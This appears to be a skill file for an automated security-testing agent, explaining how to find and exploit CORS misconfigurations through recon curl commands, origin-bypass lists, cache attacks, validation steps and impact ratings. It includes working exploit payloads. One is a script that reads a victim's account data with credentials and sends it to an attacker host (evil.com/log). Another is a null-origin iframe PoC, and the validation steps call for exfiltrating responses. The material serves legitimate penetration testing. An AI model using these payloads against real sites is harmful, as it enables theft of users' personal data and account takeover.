---
name: cors-misconfiguration
description: Cross-Origin Resource Sharing misconfiguration testing covering ACAO, ACAC, credentialed CORS exploitation, and CSP/Origin header trust boundaries
---

# CORS Misconfiguration

CORS (Cross-Origin Resource Sharing) is a browser-enforced relaxation of the same-origin policy. A misconfigured CORS policy turns a same-site browser restriction into a cross-origin data theft primitive. The core failure is the same-origin assumption that is partially undone by an over-permissive `Access-Control-Allow-Origin` (ACAO) header.

## Attack Surface

**The Header Pair**
- `Access-Control-Allow-Origin: <origin | *>` — which origins may read the response
- `Access-Control-Allow-Credentials: true` — whether the browser sends cookies/HTTP auth

**Other CORS Headers**
- `Access-Control-Allow-Methods` — what the preflight may do
- `Access-Control-Allow-Headers` — what custom headers may be sent
- `Access-Control-Expose-Headers` — which non-standard headers the JS can read
- `Access-Control-Max-Age` — preflight cache duration
- `Access-Control-Allow-Private-Network` — private network access (CORS-RFC1918)

**Origin Reflection**
- Server reads `Origin` header and reflects it into `Access-Control-Allow-Origin`
- Becomes catastrophic if `Access-Control-Allow-Credentials: true` is also set

**Trust Boundary Issues**
- Null origin: `Origin: null` (sandboxed iframes, file://, redirects)
- Subdomain trust: `Access-Control-Allow-Origin: https://*.example.com` (does NOT work in CORS — wildcards in ACAO are invalid per spec, but many servers implement it)
- Reverse proxy misconfiguration: stripping `Origin` headers, parsing errors
- Preflight bypass via method/header sanitization

**Browser Context Enablers**
- Cookies set without `SameSite` (older browsers / explicit `SameSite=None; Secure`)
- `document.domain` setter (legacy)
- Service workers / Web Workers reading responses
- `<iframe>` POSTs with `target` form (legacy cross-origin reads)

## Reconnaissance

**Identify the policy**
```
# Watch for ACAO header in every response
curl -H "Origin: https://attacker.com" -I https://target.com/api/users

# Pre-flight check
curl -X OPTIONS -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: X-Api-Key" \
  -I https://target.com/api/users
```

**Reflective origin**
```bash
for O in "https://attacker.com" "https://target.com.attacker.com" "null" \
         "https://sub.target.com" "https://targetcom" "https://target.com:80@attacker.com" \
         "https://attacker.com?target.com" "https://attacker.com#target.com"; do
  out=$(curl -s -H "Origin: $O" -I https://target.com/ | grep -i access-control-allow-origin)
  echo "$O  ->  $out"
done
```

**Credentialed + reflective** (the kill combo)
```bash
# Any reflected origin with credentials=true is exploitable
curl -H "Origin: https://attacker.com" -I https://target.com/api/me | \
  grep -i "access-control-allow"
```

**Wildcard subdomain checks**
```bash
# CORS spec doesn't allow wildcards in ACAO, but server frameworks do
curl -H "Origin: https://evil.target.com" -I https://target.com/api/
curl -H "Origin: https://attacker.com.target.com" -I https://target.com/api/
```

**WebSocket / WebRTC CORS**
- WebSocket handshake reads `Origin` — server should validate against allowlist
- WebRTC `iceServers` can leak credentials in SDP if accessible cross-origin

**Cache layer CORS**
- CDN/Reverse proxy may cache `Vary: Origin` improperly — first request's Origin becomes persistent
- Test by setting random `Origin: https://random-N.target.com` for N=1..100

## Key Vulnerabilities

### Reflected Origin with Credentials (CRITICAL)

**The exploit chain:**
1. Attacker hosts `https://evil.com/x.html`:
```html
<script>
fetch('https://target.com/api/account', {credentials: 'include'})
  .then(r => r.json()).then(d => fetch('https://evil.com/log?' + btoa(JSON.stringify(d))));
</script>
```
2. Victim visits `evil.com` (or phishing link)
3. Browser sends `Origin: https://evil.com` to `target.com`
4. Server reflects it into `Access-Control-Allow-Origin: https://evil.com` AND returns `Access-Control-Allow-Credentials: true`
5. Browser sends cookies → response is readable by `evil.com` JS → exfiltrated

**Validation:**
- Pair requests with attacker-controlled origin and a target origin
- Verify both `Access-Control-Allow-Origin: <attacker>` and `Access-Control-Allow-Credentials: true` in same response
- Use `repeat_request` to replay with an arbitrary `Origin` header

### Null Origin Acceptance

Some servers accept `Origin: null` to support sandboxed iframes, file://, or `data:` URIs. This is exploitable:
```html
<iframe sandbox="allow-scripts" srcdoc="
  <script>
  fetch('https://target.com/api/me', {credentials: 'include'})
    .then(r => r.text()).then(t => parent.postMessage(t, '*'));
  </script>
"></iframe>
```
The `sandbox` attribute produces a `null` origin, which the server may trust.

### Subdomain Wildcard

If the server returns `Access-Control-Allow-Origin: https://*.target.com` (a wildcard that's invalid but sometimes implemented):
- Any XSS / subdomain takeover on `*.target.com` = full credentialed CORS
- Chain with `subdomain_takeover` skill for full impact

### Trust of Proxy Headers

If a reverse proxy strips/replaces `Origin` and the backend trusts an `X-Forwarded-Origin: attacker.com`:
- Find the proxy fingerprint, test `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL` headers

### CORS + Cache Confusion

**Caching CORS headers without `Vary: Origin`:**
1. Attacker sends `Origin: https://attacker.com` first
2. Response (with `Access-Control-Allow-Origin: https://attacker.com`) is cached
3. Victim's request gets the cached response → reads attacker-allowed data
- Or vice versa: first request sets `Access-Control-Allow-Origin: *`, then credentialed requests fail silently (still exploitable in some scenarios)

### Preflight Cache Poisoning

If `Access-Control-Max-Age` is large (default 5s, but servers often set 86400 or higher):
- Attacker can poison the preflight cache for hours
- Then a follow-up attack with different headers passes preflight
- Particularly nasty with `Access-Control-Allow-Headers: *`

## Bypass Techniques

**If `Origin` is validated but only at the domain level:**
- `https://target.com.attacker.com` (subdomain suffix)
- `https://attacker.com/target.com` (path confusion, rarely works)
- `https://target.com@attacker.com` (userinfo confusion)
- `https://attacker.com?target.com` / `#target.com` (parser quirks)
- `https://target.com:80@attacker.com` (port confusion)
- Case tricks: `https://TARGET.com` (HTTP/2 lowercases headers)
- Trailing dots: `https://target.com.` (DNS parsing)
- `Origin: null` for sandboxed iframe origin

**If the server normalizes the origin:**
- Send the bypass with leading/trailing whitespace
- Try non-standard characters in subdomain: `https://ta\rget.com`
- HTTP/2 `:authority` vs `Origin` header mismatch

**If the server blocks specific origins:**
- Re-host on a domain the server trusts (subdomain takeover of a forgotten subdomain)

**If `Access-Control-Allow-Credentials` is blocked but credentials are needed:**
- Test if the endpoint is reachable without auth via IDOR
- Test if cookies are sent as `Authorization: Bearer` instead (and CORS doesn't apply)
- Test for CSRF (no-CORS state-changing endpoints)

**For non-credentialed CORS (`ACAO: *`):**
- Often not exploitable on its own (browser blocks reading the response)
- BUT: `Access-Control-Expose-Headers` may expose sensitive headers
- AND: `<img>`, `<script>`, `<link>` tags bypass CORS for specific content types — combine with CSP issues

## Cross-Origin Leakage Beyond CORS

CORS is one of many cross-origin data leak primitives. Test these too:

**CORB / CORP / COEP / COOP issues**
- `Cross-Origin-Opener-Policy` / `Cross-Origin-Resource-Policy` set wrong
- `Cross-Origin-Embedder-Policy` requires CORP, which some static assets don't have

**XS-Leaks** (cross-site leak)
- Frame counting, error events, `window.length`, `window.onerror`
- Service worker timing, `performance.now()` on shared resources
- Cache probing via `Sec-Fetch-Site` and timing

**Web cache poisoning**
- `X-Forwarded-Host` injection in CDN
- `X-Original-URL` rewriting

**PostMessage handlers**
- `window.addEventListener('message', ...)` with `event.origin` not validated
- `event.source.postMessage()` sends data cross-origin

**JSONP / legacy endpoints**
- Older `?callback=foo` endpoints that wrap JSON in function call
- CORS doesn't apply — script tag inclusion works

## Testing Methodology

1. **Map origins** — enumerate subdomains (`*.target.com`) that may be trusted
2. **Test bare response** — note the default CORS policy with no `Origin` header
3. **Test with attacker origin** — `Origin: https://attacker.com`
4. **Test reflective + credentials** — the kill combo
5. **Test null origin** — `Origin: null` from sandboxed iframes
6. **Test subdomain trust** — `*.target.com`, `evil.target.com.attacker.com`
7. **Test proxy header trust** — `X-Forwarded-Origin`, `X-Original-URL`
8. **Test cache behavior** — Vary header presence, poisoned preflight
9. **Test for credentialed POST** — confirm the endpoint actually uses the session cookie
10. **PoC** — host HTML on attacker domain, confirm cross-origin fetch + read works

## Validation Requirements

- Pair requests with attacker origin and a victim origin
- Demonstrate that response is readable cross-origin (status 200 + parseable body + `Access-Control-Allow-Origin: <attacker>` + `Access-Control-Allow-Credentials: true`)
- Use a real browser (or `puppeteer`/`playwright` in headless mode) — `curl` doesn't enforce CORS, so reading the body in `curl` is meaningless
- Build a real `<script>` or `<iframe>` PoC that exfiltrates the response
- Show the actual exfiltration: `fetch(..., {credentials: 'include'})` then read body and POST out
- Don't trust `curl` output alone — many CORS policies are enforced client-side

## False Positives

- `Access-Control-Allow-Origin: *` without `Access-Control-Allow-Credentials: true` (browser blocks reading response with credentials)
- Reflected origin but the endpoint is unauthenticated (no cookies sent, no exfil)
- Reflected origin but `Vary: Origin` correctly invalidates cache
- Wildcard ACAO on a static asset that has no sensitive data
- CORS policy on a 404/error endpoint (browser may not enforce)
- `SameSite=Lax` cookies (set after 2020 in Chrome) — these don't send on cross-site subresource requests, defeating the credentialed CORS attack
- `SameSite=None; Secure` cookies that require HTTPS — works, but only if the attacker page is also HTTPS

## Impact

- **Critical**: Account takeover via credentialed CORS on user-data endpoint (read profile, read PII, read API keys)
- **High**: CSRF bypass — CORS preflight may block CSRF, but reflective CORS means CSRF tokens are readable, defeating CSRF protections
- **Medium**: Information disclosure (server config, internal endpoints, debug data) via CORS-readable responses
- **Chain amplification**: reflective CORS + IDOR = mass account data theft; reflective CORS + XSS on `*.target.com` subdomain = full account compromise
